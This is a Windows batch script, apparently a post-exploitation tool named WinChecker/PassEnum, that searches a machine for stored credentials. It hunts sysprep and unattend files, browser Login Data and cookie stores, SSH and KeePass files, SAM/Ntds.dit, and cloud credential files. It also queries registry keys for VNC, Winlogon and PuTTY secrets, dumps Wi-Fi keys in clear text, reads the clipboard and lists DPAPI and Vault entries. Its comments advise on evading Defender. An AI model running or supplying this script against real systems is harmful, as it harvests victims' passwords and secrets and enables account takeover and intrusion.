@ECHO OFF & SETLOCAL EnableDelayedExpansion
color 0a
CALL :SetOnce

SET long=false

TITLE PassEnum - Windows global credencial enumeration - Running ...

cd %UserProfile%


rem #---------------------------------------------------------------------------------#
rem # Name         = WinChecker v1.0                                                  #
rem # Author       = @raphaelthief                                                    #
rem # Product      = Colt45 Production                                                #
rem #---------------------------------------------------------------------------------#


CALL :ColorLine "                                   %E%31m*####*/@@/ "                                  
CALL :ColorLine "                               %E%31m#@@#####(,,(#@@@@                           "     
CALL :ColorLine "                            %E%31m#@@@#(/**,/,  .,#%#@@@@                           "  
CALL :ColorLine "                          %E%31m#@@@@##/*,.,,....,,*######@/                        "  
CALL :ColorLine "                        %E%31m/@@@####((/*/*,,,*,,*/(##((###@#                       " 
CALL :ColorLine "                       %E%31m@@@##(/***/((****,*,,,*,*/(//*/##@*                     " 
CALL :ColorLine "                     %E%31m,@@##(*((/,*,.,.           ..**,,,*/#@#                   " 
CALL :ColorLine "                    %E%31m@@#(#*      ...                ...,,,,*(#@(                " 
CALL :ColorLine "                 %E%31m(@@/*,                                      .,%@              " 
CALL :ColorLine "               %E%31m,@*/.              %E%36m,%E%36m*************                %E%31m*#             " 
CALL :ColorLine "              %E%31m#/.               %E%36m,%E%36m******  ,********,              %E%31m./            " 
CALL :ColorLine "             %E%31m(,               %E%36m.********  ,********,               %E%31m(            "
CALL :ColorLine "             %E%31m(                 %E%36m*******,  .********,              %E%31m/             "
CALL :ColorLine "             %E%31m(                   %E%36m.,,.    *********              %E%31m/              "
CALL :ColorLine "              %E%31m#                         %E%36m********              %E%31m*                "
CALL :ColorLine "               %E%31m*.                     %E%36m.*****,                %E%31m/                 "
CALL :ColorLine "                 %E%31m/                    %E%36m****                 %E%31m/                   "
CALL :ColorLine "                 %E%31m(@/                  %E%36m***                 %E%31m##@#                " 
CALL :ColorLine "             %E%31m#(((**,*.                 %E%36m..               %E%31m,((*(#/#@@.          "  
CALL :ColorLine "        %E%31m,###(/**,,,.../             %E%36m.******            %E%31m(/((#**/((#(##/       "  
CALL :ColorLine "      %E%31m,@##/**,,,....../             %E%36m********          %E%31m,  ,/((,./(/*(,**#.     " 
CALL :ColorLine "     %E%31m@##((/,*,    ,..   .             %E%36m.,.           %E%31m*,      (,.*     ,# (,     "
CALL :ColorLine "   %E%31m@##(*///,..    ....   .                           *,      (,.*     ,# (,    "
CALL :ColorLine "  %E%31m(#/*.,../,.      ..    ,.                      ,.  *,.      ./(     ./  @*   "
CALL :ColorLine "  %E%31m##*. .  .*        .    ,.                     ..   ,*         (     ,.  (#   "
CALL :ColorLine " %E%31m/#(   .   .             ,..                    .    ,(         .  .  .   ,,#  "
CALL :ColorLine "  %E%31m./*        .            ,                           *#          .        , .  "
CALL :ColorLine "   %E%31m.,                     .                           //           .      .  "

echo.
CALL :ColorLine "  %E%33m#----------------------------------------------------------------------------#"
CALL :ColorLine "  %E%33m#      %E%32mName         =    WinChecker Password Enumeration  v1.0               %E%33m#
CALL :ColorLine "  %E%33m#      %E%32mAuthor       =    @raphaelthief                                       %E%33m#
CALL :ColorLine "  %E%33m#      %E%32mProduct      =    Colt45 Production                                   %E%33m#
CALL :ColorLine "  %E%33m#----------------------------------------------------------------------------#"
echo.


setlocal enabledelayedexpansion


REM ####################### Check admin rights for execution
net session >nul 2>&1
if %errorlevel% neq 0 (
    set ADMIN_LEVEL=0
	CALL :except
) else (
    CALL :ColorLine "%E%33mAdmin rights enabled, ready to use"
    CALL :ColorLine "%E%32mPress any key to continue ..."
    PAUSE >NUL
    echo.
    set ADMIN_LEVEL=1
	goto startX
)

:except
CALL :ColorLine "%E%31mThe script is not launched with admin rights, certain functions will be incorrectly executed  ..."
echo.
CALL :ColorLine "	%E%33m1 - %E%32mContinue"
CALL :ColorLine "	%E%33m2 - %E%32mRestart with admin rights"
CALL :ColorLine "	%E%33m3 - %E%32mClose"
echo.
set /p choix=Select : 

if "%choix%"=="1" (
	goto startX
) else if "%choix%"=="2" (
	powershell.exe -Command "Start-Process '%~dpnx0' -Verb RunAs"

	exit
) else if "%choix%"=="3" (
	exit
) else (
	CALL :ColorLine "%E%31mInvalid choice, press any key to exit ..."
	PAUSE >NUL
	exit
)


REM ####################### Here we go
:startX
REM Go to main tree at first
cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. 

REM ####################### List interesting files in directories
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] List interesting files in directories %E%32m"
CALL :ColorLine "%E%36m[+] Searching sysprep.inf ... %E%32m"
echo.
type c:\sysprep.inf 2>nul

echo.
CALL :ColorLine "%E%36m[+] Searching sysprep.xml ... %E%32m"
echo.
type c:\sysprep\sysprep.xml 2>nul

echo.
CALL :ColorLine "%E%36m[+] Searching sysprep\sysprep.xml ... %E%32m"
echo.
type %WINDIR%\Panther\Unattend\Unattended.xml 2>nul

echo.
CALL :ColorLine "%E%36m[+] Searching Panther\Unattend\Unattended.xml ... %E%32m"
echo.
type %WINDIR%\Panther\Unattended.xml 2>nul


REM ####################### Enum strict passwords files with all extension (Dates infos)
echo.
CALL :ColorLine "%E%36m[+] Searching Searching the following keywords : 'pass.*' 'password.*' 'passwords.*' 'creds.*' 'credencials.*' 'vnc.*' 'mdp.*' 'motsdepasse.*' 'motdepasse.*' 'secret.*' 'confidentiel.*' 'confidential.*' 'sensible.*' ... %E%32m"
echo.
dir /s pass.* password.* passwords.* creds.* credencials.* vnc.* mdp.* motsdepasse.* motdepasse.* secret.* confidentiel.* confidential.* sensible.*
echo.


REM ####################### Get FileZilla
echo.
CALL :ColorLine "%E%36m[+] Searching for FileZilla infos and creds %E%32m"
echo.
dir /s %USERPROFILE%\AppData\Roaming\FileZilla 2>nul REM better use dir command. You will have acces to enum withouth admin rights
echo.


REM ####################### Enum all config files (only dir)
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Searching config files ... %E%32m"
echo.
dir /s /b *.config
echo.

 
REM ####################### Enum other interesting stuff
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Looking for other interesting stuff ... %E%32m"
echo.
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == TypedURLs == TypedURLsTime == places.sqlite == key3.db == key4.db == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"


REM ####################### Webbrowsers must be checked, there are a lot confidentials infos. Not to be underestimated !
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Browsers interesting files %E%32m"

set "roaming=%APPDATA%"
set "local=%LOCALAPPDATA%"
setlocal enabledelayedexpansion

for %%A in (
    "%roaming%\Opera Software"
    "%local%\Microsoft\Edge"
    "%local%\Google\Chrome"
    "%local%\Google\Chrome SxS"
    "%local%\Google\Chrome Beta"
    "%local%\Google\Chrome Dev"
    "%local%\Google\Chrome Unstable"
    "%local%\Google\Chrome Canary"
    "%local%\BraveSoftware\Brave-Browser"
    "%local%\Vivaldi"
    "%local%\Yandex\YandexBrowser"
    "%local%\Yandex\YandexBrowserCanary"
    "%local%\Yandex\YandexBrowserDeveloper"
    "%local%\Yandex\YandexBrowserBeta"
    "%local%\Yandex\YandexBrowserTech"
    "%local%\Yandex\YandexBrowserSxS"
) do (
    if exist "%%~A" (
        echo.
		CALL :ColorLine "%E%33m[+] %E%36mBrowser dir :  %%~A %E%32m"
		set "search_dir=%%~A"
		set "last_dir=%%~A"  
		call :maFonction
    )
)


if defined last_dir (
    goto :nextit
)

:maFonction

echo.
		for /r "%search_dir%" %%a in (*) do (
			if "%%~nxa"=="Local State" (
				echo Local State : %%a
			)
		)      

echo.
		for /r "%search_dir%" %%a in (*) do (
			if "%%~nxa"=="Web Data" (
				echo Web Data : %%a
			)
		)      
	   
echo.
		for /r "%search_dir%" %%a in (*) do (
			if "%%~nxa"=="Cookies" (
				echo Cookies : %%a
			)
		)    
			
			
echo.			
		for /r "%search_dir%" %%a in (*) do (
			if "%%~nxa"=="History" (
				echo History : %%a
			)
		)    
			
echo.		
		for /r "%search_dir%" %%a in (*) do (
			if "%%~nxa"=="Login Data" (
				echo Login Data : %%a
			)
		)   
echo.	
goto :eof

:nextit


REM ####################### Enum registry stored passwords
REM ####################### https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Searching credentials files in registry %E%32m"
CALL :ColorLine "%E%33m[+] %E%36mHKCU\Software\ORL\WinVNC3\Password ... %E%32m"
echo.
reg query HKCU\Software\ORL\WinVNC3\Password 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36mHKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password ... %E%32m"
echo.
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36mHKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon ... %E%32m"
echo.
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername CachedLogonsCount"

echo.
CALL :ColorLine "%E%33m[+] %E%36mHKLM\SYSTEM\CurrentControlSet\Services\SNMP ... %E%32m"
echo.
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36mHKCU\Software\TightVNC\Server ... %E%32m"
echo.
reg query HKCU\Software\TightVNC\Server 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36mLooking inside HKCU\Software\SimonTatham\PuTTY\Sessions ... %E%32m"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36mLooking inside HKCU\Software\OpenSSH\Agent\Keys ... %E%32m"
echo.
reg query HKCU\Software\OpenSSH\Agent\Keys /s 2>nul


REM ####################### Enum global regedit 
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Registry with the following arguments : 'pass' or 'pswd' %E%32m"
echo.

if "%long%" == "true" (
	reg query HKLM /f passw /t REG_SZ /s
	reg query HKCU /f passw /t REG_SZ /s
	reg query HKLM /f pwd /t REG_SZ /s
	reg query HKCU /f pwd /t REG_SZ /s
	echo.
	CALL :T_Progress 2
) ELSE (
	CALL :T_Progress 2
)


REM ####################### GPP Passwords search
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Group policy preferences Password %E%32m"
echo.
cd "%SystemDrive%\Microsoft\Group Policy\history" 2>nul
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml 2>nul
cd "%windir%\..\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history" 2>nul
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml 2>nul


REM ####################### Cloud pass
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Cloud Credentials %E%32m"
echo.
cd "%SystemDrive%\Users"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json 2>nul
cd "%windir%\..\Documents and Settings"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json 2>nul
echo.


REM ####################### Microsoft Data Protection API 
REM ####################### https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] DPAPI Master Keys %E%32m"
echo.
powershell -command "Get-ChildItem %appdata%\Microsoft\Protect" 2>nul
powershell -command "Get-ChildItem %localappdata%\Microsoft\Protect" 2>nul

echo.
CALL :ColorLine "%E%33m[+] %E%36m%appdata%\Microsoft\Credentials\ %E%32m"
echo.
dir /b/a %appdata%\Microsoft\Credentials\ 2>nul 

echo.
CALL :ColorLine "%E%33m[+] %E%36m%localappdata%\Microsoft\Credentials\ %E%32m"
echo.
dir /b/a %localappdata%\Microsoft\Credentials\ 2>nul


REM ####################### Microsoft Data Protection API 
REM ####################### https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Windows Vault %E%32m"
echo.
cmdkey /list


REM ####################### Get Wi-Fi credencials 
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Wi-Fi Credencial %E%32m"
echo.
for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
    echo %%j | findstr /i /v "echo" && (
		CALL :ColorLine "%E%31m--------------------%E%32m"
        netsh wlan show profiles %%j key=clear
		CALL :ColorLine "%E%31m--------------------%E%32m"
    )
)


REM ####################### Clipboard stealer
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Current Clipboard %E%32m"
echo.
powershell -command "Get-Clipboard" 2>nul


REM ####################### Get PS history - Maybe there are some creds overthere
echo.
CALL :ColorLine "%E%31m--------------------"
CALL :ColorLine "%E%33m[i] Checking PowerShell history file %E%32m"
echo.
dir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul REM Don't be a skid and use dir instead of type. If you use common techniques you will be flagged by Defender


REM ####################### END
echo.
echo.
CALL :ColorLine "%E%31m#################### %E%33mScan complete %E%31m####################"
TITLE PassEnum - Windows global credencial enumeration - IDLE
PAUSE >NUL


REM ####################### Form Settings
:SetOnce
SET "E=0x1B["
SET "PercentageTrack=0"
EXIT /B

:ColorLine
SET "CurrentLine=%~1"
FOR /F "delims=" %%A IN ('FORFILES.EXE /P %~dp0 /M %~nx0 /C "CMD /C ECHO.!CurrentLine!"') DO ECHO.%%A
EXIT /B
